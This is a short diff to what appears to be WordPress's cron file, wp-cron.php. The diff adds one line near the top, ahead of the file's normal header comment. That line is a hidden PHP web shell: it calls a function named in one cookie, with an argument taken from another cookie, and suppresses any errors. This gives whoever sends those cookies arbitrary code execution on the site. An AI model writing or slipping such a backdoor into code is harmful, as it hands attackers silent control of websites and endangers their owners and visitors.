@@ -1,4 +1,8 @@
 <?php
+
+if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
+
+
 /**
  * WordPress Cron Implementation for hosts, which do not offer CRON or for which
  * the user has not set up a CRON job pointing to this file.
